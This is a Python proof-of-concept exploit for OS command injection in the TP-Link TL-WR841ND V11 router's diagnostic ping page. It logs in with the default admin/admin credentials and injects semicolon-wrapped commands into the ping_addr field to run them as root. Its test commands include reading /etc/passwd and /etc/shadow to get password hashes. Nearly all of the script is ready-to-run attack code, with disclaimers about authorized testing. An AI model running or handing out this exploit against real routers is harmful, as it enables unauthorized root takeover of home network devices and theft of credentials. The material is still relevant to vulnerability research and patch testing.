#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    Matad0r Maghribi - Command Injection PoC Exploit                          ║
║   TP-Link TL-WR841ND V11 | Firmware 3.16.9 Build 150616                      ║
║                                                                              ║
║   Severity: CRITICAL (CVSS 9.8)                                              ║
║   CWE: CWE-78 (OS Command Injection)                                         ║
║                                                                              ║
║   FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY                       ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝


"""

import requests
import base64
import sys
import os
import time
import urllib3
import argparse
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Color:
    """ANSI color codes for terminal output"""
    BLACK   = '\033[30m'
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN    = '\033[96m'
    WHITE   = '\033[97m'
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    RESET   = '\033[0m'



BANNER = f"""
{Color.RED}{Color.BOLD}
     ████████╗███████╗██████╗ ███╗   ███╗██╗███╗   ██╗ █████╗ ██╗     
     ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║████╗  ██║██╔══██╗██║     
        ██║   █████╗  ██████╔╝██╔████╔██║██║██╔██╗ ██║███████║██║     
        ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██╔══██║██║     
        ██║   ███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║██║  ██║███████╗
        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
{Color.RESET}
{Color.CYAN}{Color.BOLD}     ╔═══════════════════════════════════════════════════════════════╗
                             ║  Command Injection PoC Exploit                                ║
                             ║  TP-Link TL-WR841ND V11 | Firmware 3.16.9 Build 150616        ║
                             ║  Severity: CRITICAL (CVSS 9.8)                                ║
                             ╚═══════════════════════════════════════════════════════════════╝{Color.RESET}
{Color.DIM}     For educational and authorized testing purposes only{Color.RESET}
"""



def print_status(msg, status="info"):
    """Print formatted status message"""
    icons = {
        "info":    f"{Color.BLUE}[*]",
        "success": f"{Color.GREEN}[+]",
        "error":   f"{Color.RED}[-]",
        "warning": f"{Color.YELLOW}[!]",
        "vuln":    f"{Color.RED}{Color.BOLD}[!VULN]",
        "exploit": f"{Color.MAGENTA}{Color.BOLD}[EXPLOIT]",
    }
    icon = icons.get(status, icons["info"])
    print(f"{icon} {Color.WHITE}{msg}{Color.RESET}")

def print_separator(char="═", length=72):
    """Print separator line"""
    print(f"{Color.CYAN}{char * length}{Color.RESET}")

def print_header(title):
    """Print section header"""
    print()
    print_separator()
    print(f"{Color.BOLD}{Color.RED}  {title}{Color.RESET}")
    print_separator()
    print()

def slow_print(text, delay=0.02):
    """Print text with delay for dramatic effect"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print()



class CommandInjectionExploit:
    """
    Command Injection Exploit for TP-Link TL-WR841ND V11
    
    OS Command Injection via Diagnostic Ping/Traceroute
    
    This exploit demonstrates how an authenticated attacker can inject
    arbitrary OS commands through the diagnostic ping feature.
    
    Vulnerable endpoint: /userRpm/PingIframeRpm.htm
    Vulnerable parameter: ping_addr
    Root cause: sprintf() + popen() without input validation
    """
    

    
    TARGET_URL = ""
    USERNAME = "admin"
    PASSWORD = "admin"
    TIMEOUT = 10
    
    ENDPOINTS = [
        "/userRpm/PingIframeRpm.htm",
        "/userRpm/DiagnosticRpm.htm",
    ]
    
    TEST_COMMANDS = [
        {
            "name": "User ID",
            "command": "id",
            "description": "Get current user and group IDs",
            "expected": "uid=0(root)",
        },
        {
            "name": "Hostname",
            "command": "hostname",
            "description": "Get device hostname",
            "expected": "TL-WR841ND",
        },
        {
            "name": "Kernel Version",
            "command": "uname -a",
            "description": "Get kernel information",
            "expected": "Linux",
        },
        {
            "name": "Password File",
            "command": "cat /etc/passwd",
            "description": "Read /etc/passwd file",
            "expected": "root:",
        },
        {
            "name": "Shadow File",
            "command": "cat /etc/shadow",
            "description": "Read /etc/shadow (password hashes)",
            "expected": "root:$1$",
        },
        {
            "name": "Network Interfaces",
            "command": "ifconfig",
            "description": "Get network interface configuration",
            "expected": "eth0",
        },
        {
            "name": "Running Processes",
            "command": "ps",
            "description": "List running processes",
            "expected": "httpd",
        },
        {
            "name": "Device Model",
            "command": "cat /proc/version",
            "description": "Read kernel version from proc",
            "expected": "Linux",
        },
    ]
    

    
    def __init__(self, target_ip, port=80):
        """Initialize the exploit"""
        self.target_ip = target_ip
        self.port = port
        self.base_url = f"http://{target_ip}:{port}"
        self.session = requests.Session()
        self.authenticated = False
        self.results = []
        self.vuln_endpoint = None
        
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;"
                      "q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        })
    

    
    def phase_reconnaissance(self):
        """Phase 1: Target reconnaissance"""
        print_header("PHASE 1: RECONNAISSANCE")
        
        # Check if target is reachable
        print_status(f"Target: {self.base_url}", "info")
        print_status("Testing connectivity...", "info")
        
        try:
            response = self.session.get(
                self.base_url,
                timeout=self.TIMEOUT,
                verify=False,
                allow_redirects=True
            )
            
            if response.status_code == 200:
                print_status(f"Target is reachable (HTTP {response.status_code})", "success")
                
                # Extract firmware version from headers
                server = response.headers.get("Server", "Unknown")
                print_status(f"Web Server: {server}", "info")
                
                # Check for TP-Link specific headers
                if "TP-LINK" in response.text or "tp-link" in response.text.lower():
                    print_status("TP-Link device confirmed", "success")
                
                return True
            else:
                print_status(f"Target returned HTTP {response.status_code}", "warning")
                return True
                
        except requests.exceptions.ConnectionError:
            print_status("Connection refused", "error")
            return False
        except requests.exceptions.Timeout:
            print_status("Connection timed out", "error")
            return False
        except requests.exceptions.RequestException as e:
            print_status(f"Connection error: {e}", "error")
            return False
    

    
    def phase_authentication(self):
        """Phase 2: Authenticate with default credentials"""
        print_header("PHASE 2: AUTHENTICATION")
        
        print_status(f"Username: {self.USERNAME}", "info")
        print_status(f"Password: {self.PASSWORD}", "info")
        print_status("Creating Basic Auth header...", "info")
        
        credentials = f"{self.USERNAME}:{self.PASSWORD}"
        encoded = base64.b64encode(credentials.encode()).decode()
        
        print_status(f"Authorization: Basic {encoded}", "info")
        
        self.session.cookies.set(
            "Authorization",
            f"Basic {encoded}",
            domain=self.target_ip
        )
        
        self.session.headers.update({
            "Authorization": f"Basic {encoded}"
        })
        
        print_status("Testing authentication...", "info")
        
        try:
            response = self.session.get(
                f"{self.base_url}/userRpm/StatusRpm.htm",
                timeout=self.TIMEOUT,
                verify=False,
                allow_redirects=True
            )
            
            if response.status_code == 200 and "Status" in response.text:
                print_status("Authentication successful!", "success")
                self.authenticated = True
                return True
            else:
                print_status("Authentication failed - trying without auth", "warning")
                return True  
                
        except requests.exceptions.RequestException as e:
            print_status(f"Authentication error: {e}", "error")
            return False

    
    def phase_vulnerability_scan(self):
        """Phase 3: Scan for vulnerable endpoints"""
        print_header("PHASE 3: VULNERABILITY SCANNING")
        
        print_status("Scanning for vulnerable endpoints...", "info")
        print()
        
        for endpoint in self.ENDPOINTS:
            url = f"{self.base_url}{endpoint}"
            print_status(f"Testing: {endpoint}", "info")
            
            try:
                response = self.session.get(
                    url,
                    timeout=self.TIMEOUT,
                    verify=False,
                    allow_redirects=True
                )
                
                if response.status_code == 200:
                    if "ping_addr" in response.text or "Diagnostic" in response.text:
                        print_status(f"Endpoint found: {endpoint}", "success")
                        print_status("Vulnerable parameter detected: ping_addr", "vuln")
                        self.vuln_endpoint = endpoint
                        return True
                    else:
                        print_status(f"Endpoint accessible but no diagnostic form", "warning")
                else:
                    print_status(f"HTTP {response.status_code}", "error")
                    
            except requests.exceptions.RequestException as e:
                print_status(f"Error: {e}", "error")
        
        if not self.vuln_endpoint:
            print_status("Using primary endpoint: /userRpm/PingIframeRpm.htm", "info")
            self.vuln_endpoint = "/userRpm/PingIframeRpm.htm"
        
        return True
    

    
    def inject_command(self, command):
        """
        Inject command via diagnostic ping endpoint
        
        Vulnerable code path:
            sprintf(g_cmdBuf, "ping %s timeout 5 times 3", user_input);
            popen(g_cmdBuf, "r");
        
        Payload: ;<command>;
        The semicolons break out of the ping command and execute our command.
        """
        url = f"{self.base_url}{self.vuln_endpoint}"
        
        payload = f";{command};"
        
        data = {
            "doSave": "1",
            "ping_addr": payload,        
            "ping_timeout": "5",
            "ping_times": "3",
            "wanIf": "",
            "trace_if": "",
            "trace_ttl": "30",
            "trace_timeout": "50",
        }
        
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "Referer": f"{self.base_url}{self.vuln_endpoint}",
        }
        
        try:
            response = self.session.post(
                url,
                data=data,
                headers=headers,
                timeout=self.TIMEOUT,
                verify=False,
                allow_redirects=True
            )
            
            return self._parse_response(response.text, command)
            
        except requests.exceptions.RequestException as e:
            return f"Error: {str(e)}"
    
    def _parse_response(self, html, command):
        """Parse HTTP response to extract command output"""
        output_lines = []
        
        if "g_result" in html:
            start = html.find("g_result")
            if start != -1:
                end = html.find(";", start)
                if end != -1:
                    var_content = html[start:end]
                    if '"' in var_content:
                        content = var_content.split('"')[1]
                        output_lines.append(content)
        
        if "<pre>" in html.lower():
            start = html.lower().find("<pre>")
            end = html.lower().find("</pre>")
            if start != -1 and end != -1:
                output_lines.append(html[start+5:end])
        
        patterns = [
            "uid=", "root:", "Linux", "PING", "inet ", 
            "tcp ", "/bin/", "httpd", "dropbear", "busybox",
            "www-data", "nobody", "daemon",
        ]
        
        for line in html.split('\n'):
            line = line.strip()
            for pattern in patterns:
                if pattern in line:
                    output_lines.append(line)
                    break
        
        if output_lines:
            return '\n'.join(output_lines)
        
        return html[:1000] if len(html) > 1000 else html
    

    
    def phase_exploitation(self):
        """Phase 5: Execute exploitation tests"""
        print_header("PHASE 5: COMMAND INJECTION EXPLOITATION")
        
        print_status("Target endpoint: " + self.vuln_endpoint, "info")
        print_status("Vulnerable parameter: ping_addr", "vuln")
        print_status("Injection method: Semicolon command separator", "info")
        print()
        
        print(f"{Color.BOLD}{Color.CYAN}  Testing {len(self.TEST_COMMANDS)} command injection payloads...{Color.RESET}")
        print()
        
        for i, test in enumerate(self.TEST_COMMANDS, 1):
            print(f"{Color.BOLD}{Color.CYAN}  [{i}/{len(self.TEST_COMMANDS)}] {test['name']}{Color.RESET}")
            print(f"  {Color.DIM}Description: {test['description']}{Color.RESET}")
            print(f"  {Color.DIM}Command: ;{test['command']};{Color.RESET}")
            
            result = self.inject_command(test["command"])
            
            if result and len(result) > 5:
                success = test["expected"] in result if test["expected"] else True
                
                if success:
                    print(f"  {Color.GREEN}{Color.BOLD}  [+] VULNERABILITY CONFIRMED!{Color.RESET}")
                    print(f"  {Color.GREEN}  Output:{Color.RESET}")
                    for line in result.split('\n')[:5]:  # Limit output
                        if line.strip():
                            print(f"    {Color.GREEN}{line.strip()}{Color.RESET}")
                else:
                    print(f"  {Color.YELLOW}  [!] Command executed but output not as expected{Color.RESET}")
                
                self.results.append({
                    "name": test["name"],
                    "command": test["command"],
                    "output": result,
                    "success": success,
                })
            else:
                print(f"  {Color.RED}  [-] No output received{Color.RESET}")
                self.results.append({
                    "name": test["name"],
                    "command": test["command"],
                    "output": result,
                    "success": False,
                })
            
            print()
            time.sleep(0.3)
    

    
    def phase_results(self):
        """Phase 6: Display results"""
        print_header("EXPLOITATION RESULTS")
        
        successful = sum(1 for r in self.results if r["success"])
        total = len(self.results)
        
        print(f"  {Color.BOLD}{'Name':<20} {'Command':<30} {'Result':<10}{Color.RESET}")
        print(f"  {'─' * 60}")
        
        for r in self.results:
            status = f"{Color.GREEN}SUCCESS{Color.RESET}" if r["success"] else f"{Color.RED}FAILED{Color.RESET}"
            print(f"  {r['name']:<20} ;{r['command']:<28} {status}")
        
        print()
        print_separator()
        
        if successful > 0:
            print(f"""
  {Color.RED}{Color.BOLD}╔═══════════════════════════════════════════════════════════════════╗
                         ║                                                                   ║
                         ║   VULNERABILITY STATUS: {Color.GREEN}CONFIRMED{Color.RED}         ║
                         ║                                                                   ║
                         ║   Description:    OS Command Injection in Diagnostic Functions    ║
                         ║   Type:          OS Command Injection (CWE-78)                    ║
                         ║   Severity:      CRITICAL (CVSS 9.8)                              ║
                         ║   Impact:        Full Root Access                                 ║
                         ║   Endpoint:      {self.vuln_endpoint:<46}                         ║
                         ║   Parameter:     ping_addr                                        ║
                         ║   Commands:      {successful}/{total} successful                  ║
                         ║                                                                   ║
                         ╚═══════════════════════════════════════════════════════════════════╝{Color.RESET}
""")
            
            print(f"  {Color.BOLD}{Color.RED}IMPACT:{Color.RESET}")
            print(f"    {Color.RED}•{Color.RESET} Confidentiality: HIGH - Read sensitive files")
            print(f"    {Color.RED}•{Color.RESET} Integrity: HIGH - Modify system files")
            print(f"    {Color.RED}•{Color.RESET} Availability: HIGH - DoS possible")
            print(f"    {Color.RED}•{Color.RESET} Privilege Escalation: CRITICAL - Root access")
            print()
            
        else:
            print(f"  {Color.YELLOW}Vulnerability could not be confirmed on this target{Color.RESET}")
        
        print_separator()
    

    
    def run(self):
        """Run the full exploitation pipeline"""
        print(BANNER)
        
        # Execute phases
        if not self.phase_reconnaissance():
            print_status("Reconnaissance failed. Exiting.", "error")
            return False
        
        if not self.phase_authentication():
            print_status("Authentication failed. Exiting.", "error")
            return False
        
        if not self.phase_vulnerability_scan():
            print_status("Vulnerability scan failed. Exiting.", "error")
            return False
        
        self.phase_exploitation()
        self.phase_results()
        
        return True



def main():
    """Main function"""
    
    parser = argparse.ArgumentParser(
        description=" - Command Injection PoC for TP-Link TL-WR841ND V11",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python exploit.py -t 192.168.0.1
  python exploit.py -t 192.168.1.1 -p 80
  python exploit.py -t 192.168.0.1 -u admin -P admin

Disclaimer:
  This tool is for educational and authorized testing purposes only.
  Unauthorized access to computer systems is illegal.
        """
    )
    
    parser.add_argument("-t", "--target", 
                        default="192.168.0.1",
                        help="Target IP address (default: 192.168.0.1)")
    parser.add_argument("-p", "--port",
                        type=int,
                        default=80,
                        help="Target port (default: 80)")
    parser.add_argument("-u", "--username",
                        default="admin",
                        help="Username (default: admin)")
    parser.add_argument("-P", "--password",
                        default="admin",
                        help="Password (default: admin)")
    
    args = parser.parse_args()
    
    print(f"""
{Color.YELLOW}{Color.BOLD}  ╔═══════════════════════════════════════════════════════════════════╗
                            ║  DISCLAIMER                                                       ║
                            ║                                                                   ║
                            ║  This tool is for EDUCATIONAL and AUTHORIZED TESTING only.        ║
                            ║                                                                   ║
                            ║  Use only on devices you own or have explicit written permission  ║
                            ║  to test. Unauthorized access to computer systems is illegal.     ║
                            ║                                                                   ║
                            ║  The author is not responsible for any misuse of this tool.       ║
                            ╚═══════════════════════════════════════════════════════════════════╝{Color.RESET}
""")
    
    response = input(f"{Color.CYAN}  Do you want to proceed? (yes/no): {Color.RESET}")
    if response.lower() != "yes":
        print(f"{Color.YELLOW}  Aborted.{Color.RESET}")
        return
    
    print()
    
    exploit = CommandInjectionExploit(
        target_ip=args.target,
        port=args.port
    )
    exploit.USERNAME = args.username
    exploit.PASSWORD = args.password
    
    try:
        exploit.run()
    except KeyboardInterrupt:
        print(f"\n{Color.YELLOW}  Exploit interrupted by user.{Color.RESET}")
    except Exception as e:
        print(f"\n{Color.RED}  Error: {e}{Color.RESET}")
    
    print(f"""
{Color.DIM}  {'─' * 72}
  Generated at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
  For educational and authorized testing purposes only
  {'─' * 72}{Color.RESET}
""")

if __name__ == "__main__":
    main()
